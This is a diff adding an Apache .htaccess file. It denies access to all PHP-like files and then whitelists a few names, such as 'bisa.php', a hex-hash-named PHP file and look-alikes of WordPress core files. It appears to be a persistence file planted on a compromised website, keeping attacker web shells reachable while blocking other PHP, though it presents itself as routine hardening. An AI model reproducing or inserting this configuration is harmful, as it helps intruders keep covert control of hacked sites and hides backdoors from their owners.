@@ -1,0 +1,13 @@
+Options -Indexes
+
+<FilesMatch "\.(?:php|pHp|pht|phtml|phtm|php5|php72|phar|pgif|inc|sht|shtm|shtml|PHP|Php|PhP|PHp|pHP|phP|PHTML|Phtml|PHtml|PhTml|PhtMl|PhtmL|pHtml|pHTml|pHtMl|pHtmL|phTml|phTMl|phTmL|phtMl|phtML|PHT|Pht|PHt|PhT|pHt|pHT)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+
+<FilesMatch "^(index.php|bisa.php|site.php|error.php|components.php|defines.php|loader.php|framework.php|helper.php|tmpl.php|8be87da8e2ae0e88f3b1a0aacb24db803f26424c.php|InvalidOptions.php|class-wp-application-passwords-list-options.php|PagesHandler.inc.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+		
+DirectoryIndex index.php
